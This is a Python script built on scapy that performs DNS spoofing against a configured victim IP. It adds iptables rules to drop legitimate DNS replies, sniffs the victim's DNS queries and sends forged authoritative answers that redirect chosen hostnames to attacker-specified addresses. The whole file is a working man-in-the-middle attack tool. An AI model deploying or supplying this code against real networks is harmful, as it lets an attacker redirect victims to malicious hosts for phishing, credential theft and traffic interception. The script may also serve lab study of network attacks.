#!/usr/bin/python
from scapy.all import *
from config import *
import sys

#function to craft a spoofed Response
def dns_spoof(pkt):
    if pkt[DNS].qd.qtype == 1:
        qname = pkt[DNS].qd.qname
        if qname in dns_host:       
            spoofed_dns = IP(dst=pkt[IP].src,src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)/\
                            DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1, qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname,ttl=10,rdata=dns_host[qname]))
            send(spoofed_dns,verbose=0)

#main function
def main():
    os.system('iptables -A FORWARD -p udp --sport 53 -d ' + host_info["victimIP"] + ' -j DROP')
    os.system('iptables -A FORWARD -p tcp --sport 53 -d ' + host_info["victimIP"] + ' -j DROP')

    pkts = sniff (filter = "src host " + host_info["victimIP"] + " and dst port 53", prn = dns_spoof,store=0,iface=host_info["interface"])

if __name__ == '__main__':
      main()